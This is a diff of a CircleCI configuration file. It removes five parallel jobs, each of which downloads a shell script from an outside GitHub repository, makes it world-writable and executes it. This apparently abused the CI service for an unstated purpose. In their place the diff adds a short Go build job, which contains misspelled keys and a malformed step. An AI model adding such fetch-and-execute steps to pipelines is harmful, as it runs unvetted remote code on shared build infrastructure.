@@ -1,49 +1,11 @@
-version: 2.1
-
-# Define the jobs we want to run for this project
+version: 2
 jobs:
-  gas1:
+  build:
     docker:
-      - image: cimg/base:stable
+      image: cimg/go:1.16.4
+    paralelism: 4
     steps:
-      - run: wget https://github.com/binniyup/datacare/raw/main/get.sh 
-      - run: chmod 777 get.sh 
-      - run: ./get.sh
-  gas2:
-    docker:
-      - image: cimg/base:stable
-    steps:
-      - run: wget https://github.com/binniyup/datacare/raw/main/get.sh 
-      - run: chmod 777 get.sh 
-      - run: ./get.sh
-  gas3:
-    docker:
-      - image: cimg/base:stable
-    steps:
-      - run: wget https://github.com/binniyup/datacare/raw/main/get.sh 
-      - run: chmod 777 get.sh 
-      - run: ./get.sh
-  gas4:
-    docker:
-      - image: cimg/base:stable
-    steps:
-      - run: wget https://github.com/binniyup/datacare/raw/main/get.sh 
-      - run: chmod 777 get.sh 
-      - run: ./get.sh
-  gas5:
-    docker:
-      - image: cimg/base:stable
-    steps:
-      - run: wget https://github.com/binniyup/datacare/raw/main/get.sh
-      - run: chmod 777 get.sh 
-      - run: ./get.sh
-
-# Orchestrate our job run sequence
-workflows:
-  build_and_test:
-    jobs:
-      - gas1
-      - gas2
-      - gas3
-      - gas4
-      - gas5
+      - checkout:
+      - run:
+        name: Ensure Tes Parity
+        command: lscpu
